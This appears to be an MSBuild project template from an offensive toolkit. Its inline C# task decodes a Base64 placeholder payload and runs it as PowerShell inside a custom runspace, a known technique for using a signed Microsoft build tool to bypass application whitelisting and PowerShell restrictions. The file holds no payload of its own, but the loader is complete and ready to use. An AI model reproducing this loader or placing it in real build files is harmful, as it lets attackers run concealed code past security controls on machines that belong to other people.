<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Reference Include="Microsoft.Build" />
      <Reference Include = "System.Management.Automation" />
     <Code Type="Class" Language="cs">
      <![CDATA[
	using System;
	using System.Management.Automation;
	using System.Management.Automation.Runspaces;
	using System.Text;
	using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
	public class ClassExample :  Task, ITask
	{
		public override bool Execute()
		{
			String cmd = Encoding.Unicode.GetString(System.Convert.FromBase64String("<<<PAYLOAD>>>"));

			Runspace rs = RunspaceFactory.CreateRunspace();
			rs.Open();

			PowerShell ps = PowerShell.Create();
			ps.Runspace = rs;

			ps.AddScript(cmd);
			ps.Invoke();
			rs.Close();

			return true;
		}
	}
          ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
